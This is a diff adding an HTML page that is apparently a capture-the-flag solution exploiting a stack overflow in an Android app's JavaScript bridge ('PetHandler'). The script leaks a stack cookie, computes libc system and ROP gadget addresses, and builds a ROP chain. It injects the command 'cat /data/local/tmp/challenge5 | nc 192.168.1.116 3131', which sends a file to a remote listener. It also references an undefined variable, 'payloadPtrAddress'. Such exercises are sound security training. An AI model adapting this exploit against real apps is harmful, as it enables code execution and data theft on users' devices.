@@ -1,0 +1,179 @@
+<html>
+  <head>
+    <script>
+      window.addEventListener('load', () => {
+
+        function UInt64(high, low) {
+          this.high = high
+          this.low = low
+        }
+
+        UInt64.fromBytes = function(bytes) {
+          return new UInt64(
+              ((bytes[7] >>> 0 & 0xff) << 24 |
+                (bytes[6] >>> 0 & 0xff) << 16 |
+                (bytes[5] >>> 0 & 0xff) << 8 |
+                (bytes[4] >>> 0 & 0xff)) >>> 0,
+
+              ((bytes[3] >>> 0 & 0xff) << 24 |
+                (bytes[2] >>> 0 & 0xff) << 16 |
+                (bytes[1] >>> 0 & 0xff) << 8 |
+                (bytes[0] >>> 0 & 0xff)) >>> 0
+              )
+        }
+
+        UInt64.fromHexString = function(hex) {
+          parts = hex
+            .padStart(16, '0')
+            .match(/.{8}/g)
+
+          return new UInt64(
+            parseInt(parts[0], 16) >>> 0,
+            parseInt(parts[1], 16) >>> 0,
+          )
+        }
+
+        UInt64.prototype.clone = function() {
+          return new UInt64(
+            this.high, this.low
+          )
+        }
+
+        UInt64.prototype.toByteArray = function() {
+          return [
+            (this.low & 0xff) >>> 0,
+            (this.low >> 8 & 0xff) >>> 0,
+            (this.low >> 16 & 0xff) >>> 0,
+            (this.low >> 24 & 0xff) >>> 0,
+
+            (this.high & 0xff) >>> 0,
+            (this.high >> 8 & 0xff) >>> 0,
+            (this.high >> 16 & 0xff) >>> 0,
+            (this.high >> 24 & 0xff) >>> 0,
+          ]
+        }
+
+        UInt64.prototype.toString = function() {
+          return '' +
+            this.high.toString(16).padStart(8, '0') +
+            this.low.toString(16).padStart(8, '0')
+        }
+
+        Array.prototype.subarray = function(start, end) {
+          return this.slice(
+            start,
+            this.length + 1 - (end * -1)
+          )
+        }
+
+        Array.prototype.ofUInt64FromBytes = function(bytes) {
+          for (seek = 0; seek < bytes.length; seek += 8) {
+            this.push(UInt64.fromBytes(bytes.subarray(seek, 8)))
+          }
+
+          return this
+        }
+
+        String.prototype.toByteArray = function() {
+          return this
+            .split('')
+            .map((c) => {
+              return c.charCodeAt()
+          })
+        }
+
+        var Log = {
+          print: (message) => {
+            log.innerText += message + "\n"
+          },
+          clear: () => {
+            log.innerText = ''
+          }
+        }
+
+        var Exploit = {
+
+          getStackCookie: () => {
+            dogs = [].ofUInt64FromBytes(
+              JSON.parse(
+                PetHandler.censorMyDogs(
+                  1024,
+                  btoa('')
+              ))
+            )
+
+            return dogs[126]
+          },
+
+          injectPayload: (payload) => {
+            PetHandler.censorMyDogs(
+              1,
+              btoa(payload)
+            )
+          },
+
+          getLibCSystemAddress: () => {
+            // I'm going to use the address passed from my app
+            // through search component and add the relative system function address
+            return UInt64.fromHexString(
+              (parseInt(location.search.substr(1)) + 0x7D360).toString(16)
+            )
+          },
+
+          getPayloadLocation: () => {
+            return UInt64.fromHexString(
+              parseInt(PetHandler.getMySomething()).toString(16)
+            )
+          },
+
+          getROPGadgetAddress: () => {
+            return UInt64.fromHexString(
+              (parseInt(location.search.substr(1)) + 0xc217e).toString(16)
+            )
+          },
+        }
+
+        var stackCookie;
+        var payloadAddress;
+        var ropGadgedAddress;
+        var systemFuncAddress;
+
+        Log.print("Setting up data...")
+
+        cookie = Exploit.getStackCookie()
+        payloadAddress = Exploit.getPayloadLocation()
+        systemFuncAddress = Exploit.getLibCSystemAddress()
+        ropGadgedAddress = Exploit.getROPGadgetAddress()
+
+        Log.print("Got stack cookie: " + cookie.toString())
+        Log.print("libc execve address: " + systemFuncAddress.toString())
+        Log.print("ROP gadget address: " + ropGadgedAddress.toString())
+
+        Log.print("Injecting command...")
+
+        // Change it with your local/remote listener ip
+        Exploit.injectPayload('cat /data/local/tmp/challenge5 | nc 192.168.1.116 3131')
+
+        Log.print("Payload location: " + payloadAddress.toString())
+        Log.print("Payload ptr location: " + payloadPtrAddress.toString())
+
+        Log.print("Exploiting the stack overflow...")
+
+        payload = String.fromCharCode(0).repeat(8 * 65).toByteArray()
+        payload.push(...cookie.toByteArray())               // stack cookie
+        payload.push(...systemFuncAddress.toByteArray())    // system address - pop rbx
+        payload.push(...payloadAddress.toByteArray())       // rdi - pop r14
+        payload.push(...String.fromCharCode(0).repeat(8).toByteArray())    // rsi - pop r15 - useless for system call
+        payload.push(...ropGadgedAddress.toByteArray())     // rop gadget - ret
+
+        PetHandler.censorMyCats(
+          JSON.stringify(payload)
+        )
+
+    })
+    </script>
+  </head>
+  <body>
+    <code id="log"></code>
+  </body>
+</html>
